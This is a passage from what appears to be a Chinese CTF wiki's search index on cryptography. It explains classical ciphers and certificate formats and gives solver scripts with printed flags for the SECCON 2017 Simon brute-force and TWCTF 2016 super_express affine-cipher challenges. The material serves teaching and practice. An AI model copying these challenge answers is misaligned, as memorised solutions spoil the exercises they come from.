\u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002 \u5177\u4f53\u5982\u4e0b from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = \"fixed\" ) print key if __name__ == \"__main__\" : solve () \u7ed3\u679c\u5982\u4e0b \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\"","title":"2017 SECCON Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#_2","text":"https://en.wikipedia.org/wiki/Simon_(cipher )","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/certificate/introduction/","text":"\u8bc1\u4e66\u683c\u5f0f \u00b6 DER \u00b6 \u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 \u4e8c\u8fdb\u5236\u7f16\u7801 \uff0c\u5f53\u7136\uff0c\u8fd9\u4e9b\u8bc1\u4e66\u4e5f\u53ef\u4ee5\u4f7f\u7528 CER \u6216\u8005 CRT \u4f5c\u4e3a\u6269\u5c55\u540d\u3002 PEM \u00b6 \u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 Base64 \u7f16\u7801\uff0c\u6587\u4ef6\u7684\u5f00\u59cb\u662f\u4e00\u884c -----BEGIN \u3002 \u683c\u5f0f\u8f6c\u6362 \u00b6 openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem","title":"\u8bc1\u4e66\u683c\u5f0f"},{"location":"crypto/certificate/introduction/#_1","text":"","title":"\u8bc1\u4e66\u683c\u5f0f"},{"location":"crypto/certificate/introduction/#der","text":"\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 \u4e8c\u8fdb\u5236\u7f16\u7801 \uff0c\u5f53\u7136\uff0c\u8fd9\u4e9b\u8bc1\u4e66\u4e5f\u53ef\u4ee5\u4f7f\u7528 CER \u6216\u8005 CRT \u4f5c\u4e3a\u6269\u5c55\u540d\u3002","title":"DER"},{"location":"crypto/certificate/introduction/#pem","text":"\u4f7f\u7528\u8be5\u6269\u5c55\u540d\u7684\u8bc1\u4e66\u91c7\u7528 Base64 \u7f16\u7801\uff0c\u6587\u4ef6\u7684\u5f00\u59cb\u662f\u4e00\u884c -----BEGIN \u3002","title":"PEM"},{"location":"crypto/certificate/introduction/#_2","text":"openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem","title":"\u683c\u5f0f\u8f6c\u6362"},{"location":"crypto/classical/introduction/","text":"\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u5355\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5bc6\u7801\u3002 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u8bbe\u8ba1\u8005\u4e3b\u8981\u8003\u8651\u6d88\u606f\u7684\u4fdd\u5bc6\u6027\uff0c\u4f7f\u5f97\u53ea\u6709\u76f8\u5173\u5bc6\u94a5\u7684\u4eba\u624d\u53ef\u4ee5\u89e3\u5bc6\u5bc6\u6587\u83b7\u5f97\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u6d88\u606f\u7684\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u5219\u5e76\u6ca1\u6709\u8fdb\u884c\u592a\u591a\u7684\u8003\u8651\u3002 \u62d3\u5c55\u9605\u8bfb CTF \u4e2d\u90a3\u4e9b\u8111\u6d1e\u5927\u5f00\u7684\u7f16\u7801\u548c\u52a0\u5bc6 \u3010\u5bc6\u7801\u6559\u7a0b\u3011\u5404\u79cd\u52a0\u5bc6\u65b9\u5f0f\u8be6\u89e3\uff0c\u767e\u5ea6\u8d34\u5427","title":"\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb"},{"location":"crypto/classical/monoalphabetic/","text":"\u901a\u7528\u7279\u70b9 \u00b6 \u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3 \u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f \u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c http://quipqiup.com/ \u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002 \u51ef\u6492\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \u6bcf\u4e2a\u5b57\u6bcd \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08 \u5faa\u73af\u79fb\u52a8 \uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a \u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ \u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC \u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728 \u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0 \uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1a ROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09 \u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002 \u8fd9\u91cc\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u5bc6\u6587\uff1as0a6u3u1s0bv1a \u5bc6\u94a5\uff1aguangtou \u504f\u79fb\uff1a6,20,0,13,6,19,14,20 \u660e\u6587\uff1ay0u6u3h1y0uj1u \u7834\u89e3 \u00b6 \u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f \u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5 \u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002 \u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002 \u5de5\u5177 \u00b6 \u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002 JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5 http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php \u79fb\u4f4d\u5bc6\u7801 \u00b6 \u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002 Atbash Cipher \u00b6 \u539f\u7406 \u00b6 \u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a \u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z \u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt \u7834\u89e3 \u00b6 \u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002 \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/ \u7b80\u5355\u66ff\u6362\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a \u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz \u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm \u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002 \u7834\u89e3 \u00b6 \u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f 26! 26! \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002 \u5de5\u5177 \u00b6 http://quipqiup.com/ \u4eff\u5c04\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m \uff0c\u5176\u4e2d x x \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57 a a \u548c m m \u4e92\u8d28 m m \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002 \u89e3\u5bc6\u51fd\u6570\u662f D(x)=a^{-1}(x-b)\\pmod m D(x)=a^{-1}(x-b)\\pmod m \uff0c\u5176\u4e2d a^{-1} a^{-1} \u662f a a \u5728 \\mathbb{Z}_{m} \\mathbb{Z}_{m} \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002 \u4e0b\u9762\u6211\u4eec\u4ee5 E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a AFFINE CIPHER \uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf \u660e\u6587 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 y=5x+8 y=5x+8 8 33 33 48 73 28 18 48 83 43 28 93 y\\mod26 y\\mod26 8 7 7 22 21 2 18 22 5 17 2 15 \u5bc6\u6587 I H H W V C S W F R C P \u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f IHHWVCSWFRCP \u3002 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 a^{-1} a^{-1} \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} \uff0c\u89e3\u5bc6\u5982\u4e0b \u5bc6\u6587 I H H W V C S W F R C P y y 8 7 7 22 21 2 18 22 5 17 2 15 x=21(y-8) x=21(y-8) 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 x\\mod26 x\\mod26 0 5 5 8 13 4 2 8 15 7 4 17 \u660e\u6587 A F F I N E C I P H E R \u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002 \u7834\u89e3 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53 a=1 a=1 \u65f6\uff0c\u4eff\u5c04\u52a0\u5bc6\u662f\u51ef\u6492\u52a0\u5bc6\u3002\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u4eff\u5c04\u5bc6\u7801\u65f6\uff0c\u5176\u5b57\u7b26\u96c6\u90fd\u7528\u7684\u662f\u5b57\u6bcd\u8868\uff0c\u4e00\u822c\u53ea\u670926\u4e2a\u5b57\u6bcd\uff0c\u800c\u4e0d\u5927\u4e8e26\u7684\u4e0e26\u4e92\u7d20\u7684\u4e2a\u6570\u4e00\u5171\u6709 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \\phi(26)=\\phi(2) \\times \\phi(13) = 12 \u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f 12 \\times 26 = 312 12 \\times 26 = 312 \u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002 \u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002 \u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd y_1,y_2 y_1,y_2 \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053 y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26} \u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97 y_1-y_2=a(x_1-x_2)\\pmod{26} y_1-y_2=a(x_1-x_2)\\pmod{26} \u8fd9\u91cc y_1,y_2 y_1,y_2 \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 x_1 x_1 \u4e0e x_2 x_2 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 a a \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 b b \u4e86\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801 import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = ord ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted \u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \\begin{align*} c_1&=a_1c+b_1 \\\\ c_2&=a_2c_1+b_2 \\\\ &=a_1a_2c+a_2b_1+b_2 \\\\ &=kc+d \\end{align*} \u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e c_n\u200b c_n\u200b \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 c_n=xc+y\u200b c_n=xc+y\u200b \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002 \u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b import gmpy key = '****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = ord ( flag [ 1 ]) - ord ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipherdalte % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result \u7ed3\u679c\u5982\u4e0b \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"\u5355\u8868\u4ee3\u6362\u52a0\u5bc6"},{"location":"crypto/classical/monoalphabetic/#_1","text":"\u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3 \u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f \u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c http://quipqiup.com/ \u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002","title":"\u901a\u7528\u7279\u70b9"},{"location":"crypto/classical/monoalphabetic/#_2","text":"","title":"\u51ef\u6492\u5bc6\u7801"},{"location":"crypto/classical/monoalphabetic/#_3","text":"\u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \u6bcf\u4e2a\u5b57\u6bcd \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08 \u5faa\u73af\u79fb\u52a8 \uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a \u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ 